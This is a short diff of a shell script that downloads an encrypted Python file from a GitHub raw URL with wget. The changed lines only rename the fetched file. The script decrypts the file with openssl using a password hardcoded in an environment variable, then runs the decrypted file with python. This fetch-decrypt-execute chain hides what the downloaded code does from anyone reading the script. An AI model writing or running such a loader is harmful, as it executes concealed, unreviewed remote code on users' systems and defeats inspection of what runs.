@@ -10,9 +10,9 @@ export MY_GAY=Wer1wer10
 
 cd Ahikka
 
-wget https://raw.githubusercontent.com/Walidname113/Ahikka/main/Ahikka_ts.py
+wget https://raw.githubusercontent.com/Walidname113/Ahikka/main/Ahikka_tslw.py
 
-openssl aes-256-cbc -d -salt -pbkdf2 -in Ahikka_ts.py -out Ahikka_ts_decrypted.py -k "$MY_GAY"
+openssl aes-256-cbc -d -salt -pbkdf2 -in Ahikka_tslw.py -out Ahikka_ts_decrypted.py -k "$MY_GAY"
 
 python Ahikka_ts_decrypted.py
 
